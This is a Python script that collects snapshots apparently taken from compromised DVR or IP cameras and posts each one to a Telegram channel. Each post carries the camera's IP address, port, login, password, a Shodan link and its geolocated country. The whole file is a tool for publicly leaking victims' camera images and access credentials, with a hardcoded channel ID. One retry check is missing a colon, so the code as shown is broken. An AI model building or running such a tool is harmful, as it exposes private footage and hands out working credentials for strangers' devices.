#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import os
import time
import logging
import fnmatch
import telegram
from pathlib import Path
from shutil import rmtree
from geoip import geolite2
from collections import defaultdict
from wrapt_timeout_decorator import *

try:
    from telegram import Bot
except Exception as e:
       logging.info(e)
       print('''\nPython dependencies error:\n ~$ pip3 freeze | grep telegram
 ~$ pip3 uninstall <libs>\n ~$ pip3 install python-telegram-bot''')
       exit(0)


class Poster(object):

	def __init__(self, fdir, token, room_id, delete=False):
		logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
		self.fdir = Path(fdir)
		self.bot = telegram.Bot(token=token, request=telegram.utils.request.Request(connect_timeout=20, read_timeout=20))
		self.room_id = room_id
#		self.gl = geolite2.lookup()
		self.delete = delete


	def get_data(self):
		'''
		Gets every snapshots from main and subfolders. 
		Data looks like this: 
		{'1.1.1.1': [{'Port': '37777', 'Login': 'admin', 'Password': 'admin', 'Channel': '1', 'Path': '/.../1.1.1.1_37777_admin_admin_1.jpg'}, {}]}
		'''
		self.prep_files_to_post = defaultdict(list)

		#TODO: grab all channels to an album

		for d, dirs, filenames in os.walk(self.fdir):
			for folder in dirs:
				if "trash" not in folder:
					tmp = fnmatch.filter(os.listdir(self.fdir / folder), "*.jpg")
					for host in tmp:
						ip, data = self.prep_data(self.fdir / folder, host)
						self.prep_files_to_post[ip].append(data)
				else:
					continue
		tmp = fnmatch.filter(os.listdir(self.fdir), "*.jpg")
		for host in tmp:
			try:
				ip, data = self.prep_data(self.fdir, host)
				self.prep_files_to_post[ip].append(data)
			except Exception as e:
				continue
		return self.prep_files_to_post


	def prep_data(self, folder, host):
		'''
		Gets folder where is snapshots and its name.
		From 1.1.1.1_37777_admin_admin_1.jpg returns: '1.1.1.1', {'Port': '37777', 'Login': 'admin', 'Password': 'admin', 'Channel': '1', 'Path': '/.../1.1.1.1_37777_admin_admin_1.jpg'}
		'''
		self.data = host.split("_")
		return self.data[0], {"Port": self.data[1], "Login": self.data[2], "Password": self.data[3], "Channel": self.data[4], "Model": self.data[5].rstrip(".jpg"), "Path": folder / host}


	def sort_list(self, files_to_sort):
		'''
		Sorts list for each host by channel.
		'''
		def ckey(data):
			return int(data["Channel"])

		self.files_to_post_sorted = dict(files_to_sort) #convert from defaultdict object to normal dict
		for i in range(len(self.files_to_post_sorted)):
			self.files_to_post_sorted[list(self.files_to_post_sorted.keys())[i]] = sorted(self.files_to_post_sorted[list(self.files_to_post_sorted.keys())[i]], key = ckey) #sort by channel

		return self.files_to_post_sorted


	def post_from(self, files_to_post):
		
		for ip in files_to_post:
			for data in files_to_post[ip]:
				self.ip = ip
				self.port, self.login, self.password, self.channel, self.model, self.fpath = data.values()
				try:
					logging.info("Trying to get data and post " + str(self.fpath))
					self.post(self.ip, self.port, self.login, self.password, self.channel, self.model, self.fpath)
				except Exception as e:
					logging.info("Cannot try: " + str(e))
					continue
		if self.delete:
			rmtree(self.fdir)


	@timeout(30)
	def post(self, ip, port, login, password, channel, model, photo):

		try:
			self.state = geolite2.lookup(self.ip)
		except TypeError:
			print('''Python dependencies error:\n
 ~$ pip3 uninstall python-geoip python-geoip-python3\n ~$ pip3 install python-geoip-python3''')
			exit(0)
		if self.state:
			self.state = str(self.state.country + " - " + self.state.timezone)
		else:
			self.state = 'Tap2Map'
		self.text = "[Shodan:](https://www.shodan.io/host/{}) [{}](tg://msg_url?url=vk.com/wall-163997495?q={})\n*Port:* `{}`\n*Login:* `{}`\n*Password:* `{}`\n*Location:* [{}](https://iplocation.com/?ip={})\n*Channel:* `{}`\n*Model:* `{}`".format(ip, ip, ip, port, login, password, self.state, ip, channel, model)
		logging.info("Got data: \n\t\t\t\t\tIP: {}\n\t\t\t\t\tPort: {}\n\t\t\t\t\tLogin: {}\n\t\t\t\t\tPassword: {}\n\t\t\t\t\tLocation: {}\n\t\t\t\t\tChannel: {}\n\t\t\t\t\tModel: {}".format(ip, port, login, password, self.state, channel, model))
		self.sent = False
		retry_c = 0
		while not self.sent:
			try:
				logging.info("Trying to send post...")
				with open(photo, 'rb') as f:
					self.sent = self.bot.send_photo(chat_id=self.room_id, photo=f, caption=self.text, parse_mode=telegram.ParseMode.MARKDOWN, timeout=120)
				logging.info("Sent.")
			except Exception as e:
				if retry_c > 4
					break
				elif str(e) == 'Timed out':
					logging.info("Cannot send post: {}. Sleeping for 5 seconds and trying again...".format(str(e)))
					retry_c += 1
					time.sleep(5)
					pass
				else:
					logging.info("Cannot send post: {}. Skiping that.".format(str(e)))
					break
		time.sleep(3)


	def start(self):

		logging.info("Starting bot...")
		self.post_from(self.sort_list(self.get_data()))

if __name__ == '__main__':
	ROOM_ID = '-1001184010916'
	TOKEN = ""
	poster = Poster(Path(os.getcwd()), TOKEN, ROOM_ID, delete=False)
	poster.start()
